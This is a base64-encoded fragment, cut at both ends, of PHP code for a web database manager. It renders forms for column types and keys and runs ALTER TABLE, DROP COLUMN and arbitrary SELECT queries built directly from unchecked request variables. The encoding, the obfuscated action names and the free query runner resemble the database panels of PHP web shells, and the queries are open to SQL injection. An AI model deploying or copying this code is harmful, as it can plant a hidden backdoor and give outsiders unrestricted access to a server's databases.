AkdHlwZSA9PSAidGlueXRleHQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlRJTllURVhUICgwIH4gMjU1KTwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJURVhUIiAnOyBpZiggJHR5cGUgPT0gInRleHQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlRFWFQgKDAgfiA2NTUzNSk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iTUVESVVNVEVYVCIgJzsgaWYoICR0eXBlID09ICJtZWRpdW10ZXh0IiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5NRURJVU1URVhUICgwIH4gMTY3NzcyMTUpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IkxPTkdURVhUIiAnOyBpZiggJHR5cGUgPT0gImxvbmd0ZXh0IiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5MT05HVEVYVCAoMCB+IDQyOTQ5NjcyOTUpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlRJTllCTE9CIiAnOyBpZiggJHR5cGUgPT0gInRpbnlibG9iIiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5USU5ZQkxPQiAoMCB+IDI1NSk8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPjxpbnB1dCB0eXBlPXJhZGlvIG5hbWU9dHlwZSB2YWx1ZT0iQkxPQiIgJzsgaWYoICR0eXBlID09ICJibG9iIiApIGVjaG8gImNoZWNrZWQiO2VjaG8gJz5CTE9CICgwIH4gNjU1MzUpPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9Ik1FRElVTUJMT0IiICc7IGlmKCAkdHlwZSA9PSAibWVkaXVtYmxvYiIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+TUVESVVNQkxPQiAoMCB+IDE2Nzc3MjE1KTwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJMT05HQkxPQiIgJzsgaWYoICR0eXBlID09ICJsb25nYmxvYiIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+TE9OR0JMT0IgKDAgfiA0Mjk0OTY3Mjk1KTwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjx0ZD4mbmJzcDwvdGQ+DQo8dGQ+Jm5ic3A8L3RkPg0KPHRkPiZuYnNwPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+PGlucHV0IHR5cGU9cmFkaW8gbmFtZT10eXBlIHZhbHVlPSJFTlVNIiAnOyBpZiggJHR5cGUgPT0gImVudW0iICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPkVOVU08L3RkPg0KPHRkIGNvbHNwYW49NT48Y2VudGVyPnZhbHVlIGxpc3Q8L2NlbnRlcj48L3RkPg0KPC90cj4NCjx0cj4NCjx0ZD48aW5wdXQgdHlwZT1yYWRpbyBuYW1lPXR5cGUgdmFsdWU9IlNFVCIgJzsgaWYoICR0eXBlID09ICJzZXQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPlNFVDwvdGQ+DQo8dGQgY29sc3Bhbj01PjxjZW50ZXI+dmFsdWUgbGlzdDwvY2VudGVyPjwvdGQ+DQo8L3RyPg0KPC90YWJsZT4NCjx0YWJsZT4NCjx0cj48dGg+TTwvdGg+PHRoPkQ8L3RoPjx0aD51bnNpZ25lZDwvdGg+PHRoPnplcm9maWxsPC90aD48dGg+YmluYXJ5PC90aD48dGg+dmFsdWUgbGlzdCAoZXg6IFwnYXBwbGVcJywgXCdvcmFuZ2VcJywgXCdiYW5hbmFcJykgPC90aD48L3RyPg0KPHRyPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT10ZXh0IHNpemU9NCBuYW1lPU0gJzsgaWYoICRNICE9ICIiICkgZWNobyAidmFsdWU9JE0iO2VjaG8gJz48L3RkPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT10ZXh0IHNpemU9NCBuYW1lPUQgJzsgaWYoICREICE9ICIiICkgZWNobyAidmFsdWU9JEQiO2VjaG8gJz48L3RkPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT1jaGVja2JveCBuYW1lPXVuc2lnbmVkIHZhbHVlPSJVTlNJR05FRCIgJzsgaWYoIHN0cnBvcyggJGZpZWxkdHlwZSwgInVuc2lnbmVkIiApICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPjwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPjxpbnB1dCB0eXBlPWNoZWNrYm94IG5hbWU9emVyb2ZpbGwgdmFsdWU9IlpFUk9GSUxMIiAnOyBpZiggc3RycG9zKCAkZmllbGR0eXBlLCAiemVyb2ZpbGwiICkgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9Y2hlY2tib3ggbmFtZT1iaW5hcnkgdmFsdWU9IkJJTkFSWSIgJzsgaWYoIHN0cnBvcyggJGZpZWxkdHlwZSwgImJpbmFyeSIgKSAgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9dGV4dCBzaXplPTYwIG5hbWU9dmFsdWVsaXN0ICc7IGlmKCAkdmFsdWVsaXN0ICE9ICIiICkgZWNobyAidmFsdWU9XCIkdmFsdWVsaXN0XCIiO2VjaG8gJz48L3RkPg0KPC90cj4NCjwvdGFibGU+DQo8aDM+RmxhZ3M8L2gzPg0KPHRhYmxlPg0KPHRyPjx0aD5ub3QgbnVsbDwvdGg+PHRoPmRlZmF1bHQgdmFsdWU8L3RoPjx0aD5hdXRvIGluY3JlbWVudDwvdGg+PHRoPnByaW1hcnkga2V5PC90aD48L3RyPg0KPHRyPg0KPHRkIGFsaWduPWNlbnRlcj48aW5wdXQgdHlwZT1jaGVja2JveCBuYW1lPW5vdF9udWxsIHZhbHVlPSJOT1QgTlVMTCIgJzsgaWYoICRmaWVsZG51bGwgIT0gIllFUyIgKSBlY2hvICJjaGVja2VkIjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9dGV4dCBuYW1lPWRlZmF1bHRfdmFsdWUgJzsgaWYoICRmaWVsZGRlZmF1bHQgIT0gIiIgKSBlY2hvICJ2YWx1ZT0kZmllbGRkZWZhdWx0IjtlY2hvICc+PC90ZD4NCjx0ZCBhbGlnbj1jZW50ZXI+PGlucHV0IHR5cGU9Y2hlY2tib3ggbmFtZT1hdXRvX2luY3JlbWVudCB2YWx1ZT0iQVVUT19JTkNSRU1FTlQiICc7IGlmKCAkZmllbGRleHRyYSA9PSAiYXV0b19pbmNyZW1lbnQiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPjwvdGQ+DQo8dGQgYWxpZ249Y2VudGVyPjxpbnB1dCB0eXBlPWNoZWNrYm94IG5hbWU9cHJpbWFyeV9rZXkgdmFsdWU9IlBSSU1BUlkgS0VZIiAnOyBpZiggJGZpZWxka2V5ID09ICJQUkkiICkgZWNobyAiY2hlY2tlZCI7ZWNobyAnPjwvdGQ+DQo8L3RyPg0KPC90YWJsZT4NCjxwPic7DQoJaWYoICRjbWQgPT0gImFkZCIgKQ0KCQllY2hvICI8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0FkZCBGaWVsZCc+XG4iOw0KCWVsc2UgaWYoICRjbWQgPT0gImVkaXQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdFZGl0IEZpZWxkJz5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9YnV0dG9uIHZhbHVlPUNhbmNlbCBvbkNsaWNrPSdoaXN0b3J5LmJhY2soKSc+XG4iOw0KCWVjaG8gIjwvZm9ybT5cbiI7DQp9DQoNCmZ1bmN0aW9uIG1hbmFnZUZpZWxkX3N1Ym1pdCggJGNtZCApIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkb2xkX25hbWUsICRuYW1lLCAkdHlwZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2csDQoJCSRNLCAkRCwgJHVuc2lnbmVkLCAkemVyb2ZpbGwsICRiaW5hcnksICRub3RfbnVsbCwgJGRlZmF1bHRfdmFsdWUsICRhdXRvX2luY3JlbWVudCwgJHByaW1hcnlfa2V5LCAkdmFsdWVsaXN0Ow0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJJHF1ZXJ5U3RyID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUgQUREICRuYW1lICI7DQoJZWxzZSBpZiggJGNtZCA9PSAiZWRpdCIgKQ0KCQkkcXVlcnlTdHIgPSAiQUxURVIgVEFCTEUgJHRhYmxlbmFtZSBDSEFOR0UgJG9sZF9uYW1lICRuYW1lICI7DQoJaWYoICRNICE9ICIiICkNCgkJaWYoICREICE9ICIiICkNCgkJCSRxdWVyeVN0ciAuPSAiJHR5cGUoJE0sJEQpICI7DQoJCWVsc2UNCgkJCSRxdWVyeVN0ciAuPSAiJHR5cGUoJE0pICI7DQoJZWxzZSBpZiggJHZhbHVlbGlzdCAhPSAiIiApIHsNCgkJJHZhbHVlbGlzdCA9IHN0cmlwc2xhc2hlcyggJHZhbHVlbGlzdCApOw0KCQkkcXVlcnlTdHIgLj0gIiR0eXBlKCR2YWx1ZWxpc3QpICI7DQoJfSBlbHNlDQoJCSRxdWVyeVN0ciAuPSAiJHR5cGUgIjsNCgkkcXVlcnlTdHIgLj0gIiR1bnNpZ25lZCAkemVyb2ZpbGwgJGJpbmFyeSAiOw0KCWlmKCAkZGVmYXVsdF92YWx1ZSAhPSAiIiApDQoJCSRxdWVyeVN0ciAuPSAiREVGQVVMVCAnJGRlZmF1bHRfdmFsdWUnICI7DQoJJHF1ZXJ5U3RyIC49ICIkbm90X251bGwgJGF1dG9faW5jcmVtZW50IjsNCglteXNxbF9zZWxlY3RfZGIoICRkYm5hbWUsICRteXNxbEhhbmRsZSApOw0KCW15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIsICRteXNxbEhhbmRsZSApOw0KCSRlcnJNc2cgPSBteXNxbF9lcnJvcigpOw0KCS8vIGtleSBjaGFuZ2UNCgkka2V5Q2hhbmdlID0gZmFsc2U7DQoJJHJlc3VsdCA9IG15c3FsX3F1ZXJ5KCAiU0hPVyBLRVlTIEZST00gJHRhYmxlbmFtZSIgKTsNCgkkcHJpbWFyeSA9ICIiOw0KCXdoaWxlKCAkcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCkgKQ0KCQlpZiggJHJvd1siS2V5X25hbWUiXSA9PSAiUFJJTUFSWSIgKSB7DQoJCQlpZiggJHJvd1tDb2x1bW5fbmFtZV0gPT0gJG5hbWUgKQ0KCQkJCSRrZXlDaGFuZ2UgPSB0cnVlOw0KCQkJZWxzZQ0KCQkJCSRwcmltYXJ5IC49ICIsICRyb3dbQ29sdW1uX25hbWVdIjsNCgkJfQ0KCWlmKCAkcHJpbWFyeV9rZXkgPT0gIlBSSU1BUlkgS0VZIiApIHsNCgkJJHByaW1hcnkgLj0gIiwgJG5hbWUiOw0KCQkka2V5Q2hhbmdlID0gISRrZXlDaGFuZ2U7DQoJfQ0KCSRwcmltYXJ5ID0gc3Vic3RyKCAkcHJpbWFyeSwgMiApOw0KCWlmKCAka2V5Q2hhbmdlID09IHRydWUgKSB7DQoJCSRxID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUgRFJPUCBQUklNQVJZIEtFWSI7DQoJCW15c3FsX3F1ZXJ5KCAkcSApOw0KCQkkcXVlcnlTdHIgLj0gIjxicj5cbiIgLiAkcTsNCgkJJGVyck1zZyAuPSAiPGJyPlxuIiAuIG15c3FsX2Vycm9yKCk7DQoJCSRxID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUgQUREIFBSSU1BUlkgS0VZKCAkcHJpbWFyeSApIjsNCgkJbXlzcWxfcXVlcnkoICRxICk7DQoJCSRxdWVyeVN0ciAuPSAiPGJyPlxuIiAuICRxOw0KCQkkZXJyTXNnIC49ICI8YnI+XG4iIC4gbXlzcWxfZXJyb3IoKTsNCgl9DQoJdmlld1NjaGVtYSgpOw0KfQ0KDQpmdW5jdGlvbiBkcm9wRmllbGQoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJGZpZWxkbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJJHF1ZXJ5U3RyID0gIkFMVEVSIFRBQkxFICR0YWJsZW5hbWUgRFJPUCBDT0xVTU4gJGZpZWxkbmFtZSI7DQoJbXlzcWxfc2VsZWN0X2RiKCAkZGJuYW1lLCAkbXlzcWxIYW5kbGUgKTsNCglteXNxbF9xdWVyeSggJHF1ZXJ5U3RyICwgJG15c3FsSGFuZGxlICk7DQoJJGVyck1zZyA9IG15c3FsX2Vycm9yKCk7DQoJdmlld1NjaGVtYSgpOw0KfQ0KDQpmdW5jdGlvbiB2aWV3RGF0YSggJHF1ZXJ5U3RyICkgew0KCWdsb2JhbCAkYWN0aW9uLCAkbXlzcWxIYW5kbGUsICRkYm5hbWUsICR0YWJsZW5hbWUsICRQSFBfU0VMRiwgJGVyck1zZywgJHBhZ2UsICRyb3dwZXJwYWdlLCAkb3JkZXJieTsNCgllY2hvICI8aDE+RGF0YSBpbiBUYWJsZTwvaDE+XG4iOw0KCWlmKCAkdGFibGVuYW1lICE9ICIiICkNCgkJZWNobyAiPHAgY2xhc3M9bG9jYXRpb24+JGRibmFtZSAmZ3Q7ICR0YWJsZW5hbWU8L3A+XG4iOw0KCWVsc2UNCgkJZWNobyAiPHAgY2xhc3M9bG9jYXRpb24+JGRibmFtZTwvcD5cbiI7DQoJJHF1ZXJ5U3RyID0gc3RyaXBzbGFzaGVzKCAkcXVlcnlTdHIgKTsNCglpZiggJHF1ZXJ5U3RyID09ICIiICkgew0KCQkkcXVlcnlTdHIgPSAiU0VMRUNUICogRlJPTSAkdGFibGVuYW1lIjsNCgkJaWYoICRvcmRlcmJ5ICE9ICIiICkNCgkJCSRxdWVyeVN0ciAuPSAiIE9SREVSIEJZICRvcmRlcmJ5IjsNCgkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1hZGREYXRhJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5BZGQgRGF0YTwvYT4gfCBcbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dmlld1NjaGVtYSZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSc+U2NoZW1hPC9hPlxuIjsNCgl9DQoJJHBSZXN1bHQgPSBteXNxbF9kYl9xdWVyeSggJGRibmFtZSwgJHF1ZXJ5U3RyICk7DQoJJGZpZWxkdCA9IG15c3FsX2ZldGNoX2ZpZWxkKCRwUmVzdWx0KTsNCgkkdGFibGVuYW1lID0gJGZpZWxkdC0+dGFibGU7DQoJJGVyck1zZyA9IG15c3FsX2Vycm9yKCk7DQoJJEdMT0JBTFNbcXVlcnlTdHJdID0gJHF1ZXJ5U3RyOw0KCWlmKCAkcFJlc3VsdCA9PSBmYWxzZSApIHsNCgkJZWNob1F1ZXJ5UmVzdWx0KCk7DQoJCXJldHVybjsNCgl9DQoJaWYoICRwUmVzdWx0ID09IDEgKSB7DQoJCSRlcnJNc2cgPSAiU3VjY2VzcyI7DQoJCWVjaG9RdWVyeVJlc3VsdCgpOw0KCQlyZXR1cm47DQoJfQ0KCWVjaG8gIjxocj5cbiI7DQoJJHJvdyA9IG15c3FsX251bV9yb3dzKCAkcFJlc3VsdCApOw0KCSRjb2wgPSBteXNxbF9udW1fZmllbGRzKCAkcFJlc3VsdCApOw0KCWlmKCAkcm93ID09IDAgKSB7DQoJCWVjaG8gIk5vIERhdGEgRXhpc3QhIjsNCgkJcmV0dXJuOw0KCX0NCglpZiggJHJvd3BlcnBhZ2UgPT0gIiIgKSAkcm93cGVycGFnZSA9IDMwOw0KCWlmKCAkcGFnZSA9PSAiIiApICRwYWdlID0gMDsNCgllbHNlICRwYWdlLS07DQoJbXlzcWxfZGF0YV9zZWVrKCAkcFJlc3VsdCwgJHBhZ2UgKiAkcm93cGVycGFnZSApOw0KCWVjaG8gIjx0YWJsZSBjZWxsc3BhY2luZz0xIGNlbGxwYWRkaW5nPTI+XG4iOw0KCWVjaG8gIjx0cj5cbiI7DQoJZm9yKCAkaSA9IDA7ICRpIDwgJGNvbDsgJGkrKyApIHsNCgkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfZmllbGQoICRwUmVzdWx0LCAkaSApOw0KCQllY2hvICI8dGg+IjsNCgkJaWYoJGFjdGlvbiA9PSAiZG1sbGQwUmhkR0U9IikNCgkJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJm9yZGVyYnk9Ii4kZmllbGQtPm5hbWUuIic+Ii4kZmllbGQtPm5hbWUuIjwvYT5cbiI7DQoJCWVsc2UNCgkJCWVjaG8gJGZpZWxkLT5uYW1lLiJcbiI7DQoJCWVjaG8gIjwvdGg+XG4iOw0KCX0NCgllY2hvICI8dGggY29sc3Bhbj0yPkFjdGlvbjwvdGg+XG4iOw0KCWVjaG8gIjwvdHI+XG4iOw0KCWZvciggJGkgPSAwOyAkaSA8ICRyb3dwZXJwYWdlOyAkaSsrICkgew0KCQkkcm93QXJyYXkgPSBteXNxbF9mZXRjaF9yb3coICRwUmVzdWx0ICk7DQoJCWlmKCAkcm93QXJyYXkgPT0gZmFsc2UgKSBicmVhazsNCgkJZWNobyAiPHRyPlxuIjsNCgkJJGtleSA9ICIiOw0KCQlmb3IoICRqID0gMDsgJGogPCAkY29sOyAkaisrICkgew0KCQkJJGRhdGEgPSAkcm93QXJyYXlbJGpdOw0KCQkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfZmllbGQoICRwUmVzdWx0LCAkaiApOw0KCQkJaWYoICRmaWVsZC0+cHJpbWFyeV9rZXkgPT0gMSApDQoJCQkJJGtleSAuPSAiJiIgLiAkZmllbGQtPm5hbWUgLiAiPSIgLiAkZGF0YTsNCgkJCWlmKCBzdHJsZW4oICRkYXRhICkgPiAzMCApDQoJCQkJJGRhdGEgPSBzdWJzdHIoICRkYXRhLCAwLCAzMCApIC4gIi4uLiI7DQoJCQkkZGF0YSA9IGh0bWxzcGVjaWFsY2hhcnMoICRkYXRhICk7DQoJCQllY2hvICI8dGQ+XG4iOw0KCQkJZWNobyAiJGRhdGFcbiI7DQoJCQllY2hvICI8L3RkPlxuIjsNCgkJfQ0KCQlpZiggJGtleSA9PSAiIiApDQoJCQllY2hvICI8dGQgY29sc3Bhbj0yPm5vIEtleTwvdGQ+XG4iOw0KCQllbHNlIHsNCgkJCWVjaG8gIjx0ZD48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWVkaXREYXRhJGtleSZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSc+RWRpdDwvYT48L3RkPlxuIjsNCgkJCWVjaG8gIjx0ZD48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWRlbGV0ZURhdGEka2V5JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0RlbGV0ZSBSb3c/JylcIj5EZWxldGU8L2E+PC90ZD5cbiI7DQoJCX0NCgkJZWNobyAiPC90cj5cbiI7DQoJfQ0KCWVjaG8gIjwvdGFibGU+XG4iOw0KCWVjaG8gIjxmb250IHNpemU9MiBjbGFzcz1cIm5ld1wiPlxuIjsNCglpZigkYWN0aW9uID09ICJkbWxsZDBSaGRHRT0iKQ0KCQllY2hvICI8Zm9ybSBhY3Rpb249JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBtZXRob2Q9cG9zdD5cbiI7DQoJZWxzZQ0KCQllY2hvICI8Zm9ybSBhY3Rpb249JyRQSFBfU0VMRj9hY3Rpb249cXVlcnkmZGJuYW1lPSRkYm5hbWUmdGFibGVuYW1lPSR0YWJsZW5hbWUmcXVlcnlTdHI9JHF1ZXJ5U3RyJyBtZXRob2Q9cG9zdD5cbiI7DQoJZWNobyAoJHBhZ2UrMSkuIi8iLihpbnQpKCRyb3cvJHJvd3BlcnBhZ2UrMSkuIiBwYWdlIjsNCgllY2hvICI8L2ZvbnQ+XG4iOw0KCWVjaG8gIiB8ICI7DQoJaWYoICRwYWdlID4gMCApIHsNCgkJaWYoJGFjdGlvbiA9PSAiZG1sbGQwUmhkR0U9IikNCgkJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJnBhZ2U9Ii4oJHBhZ2UpOw0KCQllbHNlDQoJCQllY2hvICI8YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPXF1ZXJ5JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJnF1ZXJ5U3RyPSRxdWVyeVN0ciZwYWdlPSIuKCRwYWdlKTsNCgkJaWYoICRvcmRlcmJ5ICE9ICIiICYmICRhY3Rpb24gPT0gImRtbGxkMFJoZEdFPSIpDQoJCQllY2hvICImb3JkZXJieT0kb3JkZXJieSI7DQoJCWVjaG8gIic+UHJldjwvYT5cbiI7DQoJfSBlbHNlDQoJCWVjaG8gIjxmb250IHNpemU9MiBjbGFzcz1cIm5ld1wiPlByZXY8L2ZvbnQ+IjsNCgllY2hvICIgfCAiOw0KCWlmKCAkcGFnZSA8ICgkcm93LyRyb3dwZXJwYWdlKS0xICkgew0KCQlpZigkYWN0aW9uID09ICJkbWxsZDBSaGRHRT0iKQ0KCQkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1kbWxsZDBSaGRHRT0mZGJuYW1lPSRkYm5hbWUmdGFibGVuYW1lPSR0YWJsZW5hbWUmcGFnZT0iLigkcGFnZSsyKTsNCgkJZWxzZQ0KCQkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1xdWVyeSZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSZxdWVyeVN0cj0kcXVlcnlTdHImcGFnZT0iLigkcGFnZSsyKTsNCgkJaWYoICRvcmRlcmJ5ICE9ICIiICYmICRhY3Rpb24gPT0gImRtbGxkMFJoZEdFPSIpDQoJCQllY2hvICImb3JkZXJieT0kb3JkZXJieSI7DQoJCWVjaG8gIic+TmV4dDwvYT5cbiI7DQoJfSBlbHNlDQoJCWVjaG8gIk5leHQiOw0KCWVjaG8gIiB8ICI7DQoJaWYoICRyb3cgPiAkcm93cGVycGFnZSApIHsNCgkJZWNobyAiPGlucHV0IHR5cGU9dGV4dCBzaXplPTQgbmFtZT1wYWdlPlxuIjsNCgkJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdHbyc+XG4iOw0KCX0NCgllY2hvICI8L2Zvcm0+XG4iOw0KCWVjaG8gIjwvZm9udD5cbiI7DQp9DQoNCmZ1bmN0aW9uIG1hbmFnZURhdGEoICRjbWQgKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGgxPkFkZCBEYXRhPC9oMT5cbiI7DQoJZWxzZSBpZiggJGNtZCA9PSAiZWRpdCIgKSB7DQoJCWVjaG8gIjxoMT5FZGl0IERhdGE8L2gxPlxuIjsNCgkJJHBSZXN1bHQgPSBteXNxbF9saXN0X2ZpZWxkcyggJGRibmFtZSwgJHRhYmxlbmFtZSApOw0KCQkkbnVtID0gbXlzcWxfbnVtX2ZpZWxkcyggJHBSZXN1bHQgKTsNCgkJJGtleSA9ICIiOw0KCQlmb3IoICRpID0gMDsgJGkgPCAkbnVtOyAkaSsrICkgew0KCQkJJGZpZWxkID0gbXlzcWxfZmV0Y2hfZmllbGQoICRwUmVzdWx0LCAkaSApOw0KCQkJaWYoICRmaWVsZC0+cHJpbWFyeV9rZXkgPT0gMSApDQoJCQkJaWYoICRmaWVsZC0+bnVtZXJpYyA9PSAxICkNCgkJCQkJJGtleSAuPSAkZmllbGQtPm5hbWUgLiAiPSIgLiAkR0xPQkFMU1skZmllbGQtPm5hbWVdIC4gIiBBTkQgIjsNCgkJCQllbHNlDQoJCQkJCSRrZXkgLj0gJGZpZWxkLT5uYW1lIC4gIj0nIiAuICRHTE9CQUxTWyRmaWVsZC0+bmFtZV0gLiAiJyBBTkQgIjsNCgkJfQ0KCQkka2V5ID0gc3Vic3RyKCAka2V5LCAwLCBzdHJsZW4oJGtleSktNCApOw0KCQlteXNxbF9zZWxlY3RfZGIoICRkYm5hbWUsICRteXNxbEhhbmRsZSApOw0KCQkkcFJlc3VsdCA9IG15c3FsX3F1ZXJ5KCAkcXVlcnlTdHIgPSAgIlNFTEVDVCAqIEZST00gJHRhYmxlbmFtZSBXSEVSRSAka2V5IiwgJG15c3FsSGFuZGxlICk7DQoJCSRkYXRhID0gbXlzcWxfZmV0Y2hfYXJyYXkoICRwUmVzdWx0ICk7DQoJfQ0KCWVjaG8gIjxwIGNsYXNzPWxvY2F0aW9uPiRkYm5hbWUgJmd0OyAkdGFibGVuYW1lPC9wPlxuIjsNCgllY2hvICI8Zm9ybSBhY3Rpb249JyRQSFBfU0VMRicgbWV0aG9kPXBvc3Q+XG4iOw0KCWlmKCAkY21kID09ICJhZGQiICkNCgkJZWNobyAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0aW9uIHZhbHVlPWFkZERhdGFfc3VibWl0PlxuIjsNCgllbHNlIGlmKCAkY21kID09ICJlZGl0IiApDQoJCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdGlvbiB2YWx1ZT1lZGl0RGF0YV9zdWJtaXQ+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWRibmFtZSB2YWx1ZT0kZGJuYW1lPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT10YWJsZW5hbWUgdmFsdWU9JHRhYmxlbmFtZT5cbiI7DQoJZWNobyAiPHRhYmxlIGNlbGxzcGFjaW5nPTEgY2VsbHBhZGRpbmc9Mj5cbiI7DQoJZWNobyAiPHRyPlxuIjsNCgllY2hvICI8dGg+TmFtZTwvdGg+XG4iOw0KCWVjaG8gIjx0aD5UeXBlPC90aD5cbiI7DQoJZWNobyAiPHRoPkZ1bmN0aW9uPC90aD5cbiI7DQoJZWNobyAiPHRoPkRhdGE8L3RoPlxuIjsNCgllY2hvICI8L3RyPlxuIjsNCgkkcFJlc3VsdCA9IG15c3FsX2RiX3F1ZXJ5KCAkZGJuYW1lLCAiU0hPVyBmaWVsZHMgRlJPTSAkdGFibGVuYW1lIiApOw0KCSRudW0gPSBteXNxbF9udW1fcm93cyggJHBSZXN1bH